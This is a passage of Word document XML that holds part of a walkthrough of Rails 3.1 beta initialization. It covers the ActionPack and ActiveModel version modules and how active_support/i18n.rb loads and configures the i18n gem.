              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>File.directory?(activesupport_path) &amp;&amp; !$:.include?(activesupport_path)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="11BA9980" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3E9F8C08" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>activemodel_path = File.expand_path('../../../activemodel/lib', __FILE__)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="09CBE228" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>$:.unshift(activemodel_path) if</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>File.directory?(activemodel_path) &amp;&amp; !$:.include?(activemodel_path)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0B0FE777" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">In effect, these lines only define the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>activesupport_path</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>activemodel_path</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> variables and nothing more.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C2F6D8F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>The next two requires in this file are already done, so they are not run:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5520"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="213D3583" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="428B0308" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>require 'active_support'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6A001BF3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>require 'active_support/dependencies/autoload'</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="443A9C36" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The following require is to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>action_pack</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>activesupport/lib/action_pack.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">) which has a 22-line copyright notice at the top of it and ends in a simple require to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>action_pack/version</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. This file, like other </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>version.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> files before it, defines the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActionPack::VERSION</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> constant:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7128"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="639402FA" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1787913F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>module</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>ActionPack</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="46DBD841" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  module</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>VERSION</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>#:nodoc:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7B04228E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    MAJOR</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= 3</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="68AEA5D5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    MINOR</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= 1</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0F1CCD26" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    TINY</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve">  </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= 0</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5EF6EC71" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    PRE</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve">   </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= "beta"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="41D98963" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="517868BD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    STRING</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= [MAJOR, MINOR, TINY, PRE].compact.join('.')</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="13570955" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0D0DC039" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="40431A78" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Once </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>action_pack</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is finished, then </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_model</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is required.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="695B4BC7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.41 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>activemodel/lib/active_model.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E76F77E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This file makes a require to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_model/version</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> which defines the version for Active Model:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7128"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="211D5971" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="650193AF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>module</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>ActiveModel</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="088B849B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  module</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>VERSION</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>#:nodoc:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6B6AF497" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    MAJOR</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= 3</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="01362D3C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    MINOR</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= 1</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="16720B53" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    TINY</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve">  </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= 0</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="30292F4B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    PRE</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve">   </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= "beta"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="370821CE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4E05BDF4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    STRING</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= [MAJOR, MINOR, TINY, PRE].compact.join('.')</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4D552131" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="55E72FB0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7DFD0A1B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Once the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>version.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> file is loaded, the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActiveModel</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> module has its autoloaded constants defined as well as a sub-module called </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActiveModel::Serializers</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> which has autoloads of its own. When the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActiveModel</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> module is closed the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/i18n</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> file is required.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F79A7A4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.42 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>activesupport/lib/active_support/i18n.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="292125E8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This is where the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>i18n</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> gem is required and first configured:</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72A27284" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="77B7FB56" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>begin</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="68320C13" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  require 'i18n'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="63061C3A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  require 'active_support/lazy_load_hooks'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7C75C96A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>rescue</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>LoadError =&gt; e</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4DBCDA5F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  $stderr.puts "You don't have i18n installed in your application. Please add it to your Gemfile and run bundle install"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="611259E2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  raise</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>e</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="180F181C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="161C97F5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="61FE44CE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>I18n.load_path &lt;&lt; "#{File.dirname(__FILE__)}/locale/en.yml"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5D10306E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">In effect, the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>I18n</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> module first defined by </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>i18n_railtie</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is extended by the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>i18n</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> gem, rather than the other way around. This has no ill effect. They both work on the same way.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="511EDD2D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This is another spot where </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/lazy_load_hooks</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is required, but it has already been required so it’s not loaded again.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2817F2CC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>i18n</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> cannot be loaded, the user is presented with an error which says that it cannot be loaded and recommends that it’s added to the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Gemfile</w:t>
      </w:r>
      <w:r>
        <w:t>. However, in a normal Rails application this gem would be loaded.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39CA41B8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Once it has finished loading, the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>I18n.load_path</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method is used to add the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>activesupport/lib/active_support/locale/en.yml</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> file to I18n’s load path. When the translations are loaded in the initialization process, this is one of the files where they will be sourced from.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F47FFDF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The loading of this file finishes the loading of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_model</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and so we go back to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>action_dispatch</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="282FC131" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.43 Back to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>activesupport/lib/action_dispatch.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B132A99" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The remainder of this file requires the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rack</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> file from the Rack gem which defines the </w:t>
      </w:r>
      <w:r>
